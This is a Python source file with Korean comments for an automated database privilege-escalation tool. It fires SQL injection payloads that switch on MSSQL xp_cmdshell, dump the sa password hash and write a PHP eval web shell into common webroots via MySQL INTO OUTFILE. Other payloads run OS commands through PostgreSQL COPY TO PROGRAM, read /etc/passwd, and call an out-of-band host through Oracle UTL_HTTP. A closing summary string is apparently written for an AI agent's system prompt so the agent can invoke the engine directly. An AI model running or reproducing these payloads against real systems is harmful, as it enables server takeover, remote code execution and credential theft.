"""
DB Privilege Escalation Automator
===================================
MSSQL xp_cmdshell 자동 활성화, MySQL INTO OUTFILE,
PostgreSQL COPY TO PROGRAM, Oracle UTL_FILE 등을
자동 시도하여 OS 레벨 명령 실행 또는 파일 쓰기를 달성.

의존: sqli_auto.SqliAutoEngine (에러 기반 추출용)
"""
from __future__ import annotations

import re
import time
from dataclasses import dataclass
from typing import Callable


@dataclass
class PrivescResult:
    success: bool
    method: str       # xp_cmdshell / into_outfile / copy_program / udf / manual
    db_type: str
    evidence: str
    output: str = ""
    webroot_path: str = ""


# ══════════════════════════════════════════════════════════════
# MSSQL xp_cmdshell 활성화 및 실행
# ══════════════════════════════════════════════════════════════

MSSQL_XP_CMDSHELL_ENABLE = [
    # 방법 1: sp_configure
    "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--",
    "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--",
    # 방법 2: EXECUTE AS + sp_configure (낮은 권한 우회)
    "'; EXECUTE AS LOGIN='sa'; EXEC sp_configure 'show advanced options',1; "
    "RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; REVERT;--",
    # 방법 3: OPENROWSET 우회
    "'; EXEC master..xp_cmdshell 'echo pwned > C:\\\\inetpub\\\\wwwroot\\\\t.txt';--",
]

MSSQL_XP_CMDSHELL_TEST = "'; EXEC master..xp_cmdshell 'whoami';--"

MSSQL_EXEC_AS_LOGIN = [
    "'; EXECUTE AS LOGIN='sa'--",
    "'; EXECUTE AS LOGIN='dbo'--",
    "'; EXECUTE AS USER='dbo'--",
    "'; EXECUTE AS USER='db_owner'--",
]

# 낮은 권한 유저로 sa 해시 탈취
MSSQL_SA_HASH = (
    "'; DECLARE @h nvarchar(200); "
    "SELECT @h=password_hash FROM sys.sql_logins WHERE name='sa'; "
    "EXEC('SELECT ' + @h)--"
)


# ══════════════════════════════════════════════════════════════
# MySQL 파일 쓰기 (INTO OUTFILE)
# ══════════════════════════════════════════════════════════════

MYSQL_OUTFILE_PATHS = [
    "/var/www/html/",
    "/var/www/",
    "/usr/share/nginx/html/",
    "/srv/www/htdocs/",
    "/home/wwwrun/htdocs/",
    "C:/inetpub/wwwroot/",
    "C:/xampp/htdocs/",
    "C:/wamp/www/",
    "D:/wwwroot/",
]

MYSQL_WEBSHELL_PAYLOAD = "<?php @eval($_POST['x']); ?>"

MYSQL_OUTFILE_PAYLOADS: list[tuple[str, str]] = [
    # (payload_template, description)
    (
        "' UNION SELECT '{shell}' INTO OUTFILE '{path}shell.php'--",
        "UNION INTO OUTFILE"
    ),
    (
        "' AND 1=2 UNION SELECT '{shell}' INTO OUTFILE '{path}test.php'--",
        "UNION INTO OUTFILE (false)"
    ),
]

# secure_file_priv 우회
MYSQL_DUMPFILE_PAYLOAD = (
    "' UNION SELECT {hex_shell} INTO DUMPFILE '{path}'--"
)


# ══════════════════════════════════════════════════════════════
# PostgreSQL COPY TO PROGRAM
# ══════════════════════════════════════════════════════════════

PGSQL_COPY_PROGRAM = [
    "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt';--",
    "'; CREATE TABLE cmd(x text); "
    "COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd; DROP TABLE cmd;--",
]

# pg_read_file (슈퍼유저 전용)
PGSQL_READ_FILE = "'; SELECT pg_read_file('/etc/passwd',0,100)--"


# ══════════════════════════════════════════════════════════════
# Oracle UTL_FILE / UTL_HTTP
# ══════════════════════════════════════════════════════════════

ORACLE_UTL_HTTP = (
    "' UNION SELECT UTL_HTTP.REQUEST('http://{{OAST}}/x') FROM DUAL--"
)

ORACLE_UTL_FILE_READ = (
    "'; DECLARE f utl_file.file_type; "
    "s varchar2(200); "
    "BEGIN f:=utl_file.fopen('/etc','passwd','r'); "
    "utl_file.get_line(f,s); utl_file.fclose(f); "
    "EXECUTE IMMEDIATE 'SELECT ' || s || ' FROM dual'; END;--"
)


# ══════════════════════════════════════════════════════════════
# 권한 상승 자동 시도 컨트롤러
# ══════════════════════════════════════════════════════════════

class DbPrivescEngine:
    """
    SQLi 취약점 확인 후 OS 권한 상승까지 자동 시도.
    AI 코드 블록에서 바로 호출 가능한 단순 인터페이스.
    """

    def __init__(
        self,
        send_payload_fn: Callable[[str], str],
        db_type: str = "mssql",
        log_fn: Callable[[str], None] | None = None,
    ):
        """
        send_payload_fn: payload 문자열을 받아 응답 body(str)를 반환하는 함수
        db_type: 'mssql' | 'mysql' | 'postgresql' | 'oracle'
        """
        self._send = send_payload_fn
        self.db_type = db_type
        self.log = log_fn or (lambda s: None)

    def run(self) -> PrivescResult:
        """DB 타입에 맞는 권한 상승 자동 시도"""
        if self.db_type == "mssql":
            return self._mssql_privesc()
        elif self.db_type == "mysql":
            return self._mysql_outfile()
        elif self.db_type == "postgresql":
            return self._pgsql_copy()
        elif self.db_type == "oracle":
            return self._oracle_utl()
        return PrivescResult(
            success=False, method="none", db_type=self.db_type,
            evidence="Unknown DB type"
        )

    # ── MSSQL ─────────────────────────────────────────────
    def _mssql_privesc(self) -> PrivescResult:
        self.log("[DbPrivesc] MSSQL xp_cmdshell 활성화 시도...")
        for pl in MSSQL_XP_CMDSHELL_ENABLE:
            resp = self._send(pl)
            time.sleep(0.4)

        # xp_cmdshell 테스트
        resp = self._send(MSSQL_XP_CMDSHELL_TEST)
        if re.search(r"nt authority|system|authority\\network", resp, re.I):
            self.log("[DbPrivesc✓] MSSQL xp_cmdshell RCE 확인!")
            return PrivescResult(
                success=True, method="xp_cmdshell", db_type="mssql",
                evidence="whoami → NT AUTHORITY",
                output=resp[:500],
            )

        # EXECUTE AS 시도
        self.log("[DbPrivesc] MSSQL EXECUTE AS 시도...")
        for pl in MSSQL_EXEC_AS_LOGIN:
            resp = self._send(pl)
            time.sleep(0.3)
            if not re.search(r"error|permission|denied", resp, re.I):
                self.log(f"[DbPrivesc✓] EXECUTE AS 성공: {pl[:60]}")
                return PrivescResult(
                    success=True, method="execute_as", db_type="mssql",
                    evidence=f"EXECUTE AS succeeded: {pl[:60]}",
                    output=resp[:300],
                )

        # sa 해시 탈취 시도
        self.log("[DbPrivesc] MSSQL sa 해시 탈취 시도...")
        resp = self._send(MSSQL_SA_HASH)
        if resp.strip():
            return PrivescResult(
                success=True, method="sa_hash_dump", db_type="mssql",
                evidence="sa password_hash extracted",
                output=resp[:300],
            )

        return PrivescResult(
            success=False, method="xp_cmdshell", db_type="mssql",
            evidence="xp_cmdshell / EXECUTE AS 모두 실패"
        )

    # ── MySQL ──────────────────────────────────────────────
    def _mysql_outfile(self) -> PrivescResult:
        self.log("[DbPrivesc] MySQL INTO OUTFILE 시도...")
        import binascii
        hex_shell = "0x" + binascii.hexlify(
            MYSQL_WEBSHELL_PAYLOAD.encode()
        ).decode()

        for path in MYSQL_OUTFILE_PATHS:
            for pl_tmpl, desc in MYSQL_OUTFILE_PAYLOADS:
                pl = pl_tmpl.format(
                    shell=MYSQL_WEBSHELL_PAYLOAD.replace("'", "\\'"),
                    path=path,
                )
                resp = self._send(pl)
                time.sleep(0.4)
                if not re.search(r"error|denied|secure_file_priv", resp, re.I):
                    self.log(f"[DbPrivesc✓] MySQL INTO OUTFILE 성공: {path}")
                    return PrivescResult(
                        success=True, method="into_outfile", db_type="mysql",
                        evidence=f"INTO OUTFILE → {path}shell.php",
                        webroot_path=f"{path}shell.php",
                    )

        # DUMPFILE 시도
        for path in MYSQL_OUTFILE_PATHS[:3]:
            pl = MYSQL_DUMPFILE_PAYLOAD.format(
                hex_shell=hex_shell, path=f"{path}sh.php"
            )
            resp = self._send(pl)
            time.sleep(0.4)
            if not re.search(r"error|denied", resp, re.I):
                return PrivescResult(
                    success=True, method="into_dumpfile", db_type="mysql",
                    evidence=f"INTO DUMPFILE → {path}sh.php",
                    webroot_path=f"{path}sh.php",
                )

        return PrivescResult(
            success=False, method="into_outfile", db_type="mysql",
            evidence="INTO OUTFILE / DUMPFILE 모두 실패 (secure_file_priv?)"
        )

    # ── PostgreSQL ─────────────────────────────────────────
    def _pgsql_copy(self) -> PrivescResult:
        self.log("[DbPrivesc] PostgreSQL COPY TO PROGRAM 시도...")
        for pl in PGSQL_COPY_PROGRAM:
            resp = self._send(pl)
            time.sleep(0.4)
            if re.search(r"root|www-data|postgres", resp, re.I):
                return PrivescResult(
                    success=True, method="copy_program", db_type="postgresql",
                    evidence="COPY TO PROGRAM output: " + resp[:200],
                    output=resp[:300],
                )

        self.log("[DbPrivesc] PostgreSQL pg_read_file 시도...")
        resp = self._send(PGSQL_READ_FILE)
        if "root:" in resp or "postgres:" in resp:
            return PrivescResult(
                success=True, method="pg_read_file", db_type="postgresql",
                evidence="/etc/passwd read",
                output=resp[:300],
            )

        return PrivescResult(
            success=False, method="copy_program", db_type="postgresql",
            evidence="COPY TO PROGRAM 실패"
        )

    # ── Oracle ─────────────────────────────────────────────
    def _oracle_utl(self) -> PrivescResult:
        self.log("[DbPrivesc] Oracle UTL_FILE 시도...")
        resp = self._send(ORACLE_UTL_FILE_READ)
        if "root:" in resp:
            return PrivescResult(
                success=True, method="utl_file", db_type="oracle",
                evidence="/etc/passwd via UTL_FILE",
                output=resp[:300],
            )
        return PrivescResult(
            success=False, method="utl_file", db_type="oracle",
            evidence="UTL_FILE 실패"
        )


# ══════════════════════════════════════════════════════════════
# AI 시스템 프롬프트용 요약
# ══════════════════════════════════════════════════════════════

DB_PRIVESC_SUMMARY = """
=== DB PRIVILEGE ESCALATION (AUTO) ===

MSSQL priority:
  [1] sp_configure → xp_cmdshell enable → whoami/cmd.exe
  [2] EXECUTE AS LOGIN='sa'/'dbo' → re-run xp_cmdshell
  [3] sys.sql_logins password_hash dump → offline crack (hashcat -m 1731)

MySQL priority:
  [1] ' UNION SELECT '<?php @eval($_POST[x]); ?>' INTO OUTFILE '/path/shell.php'
  [2] INTO DUMPFILE with hex payload
  [3] Common webroot paths: /var/www/html/, /srv/www/, D:/wwwroot/

PostgreSQL priority:
  [1] COPY (SELECT '') TO PROGRAM 'id' → OS command
  [2] pg_read_file('/etc/passwd') → credential harvest

Oracle priority:
  [1] UTL_HTTP OOB exfiltration
  [2] UTL_FILE read /etc/passwd

from bingo.tools.db_privesc import DbPrivescEngine
engine = DbPrivescEngine(send_fn, db_type='mssql')
result = engine.run()
# result.success, result.method, result.output
"""
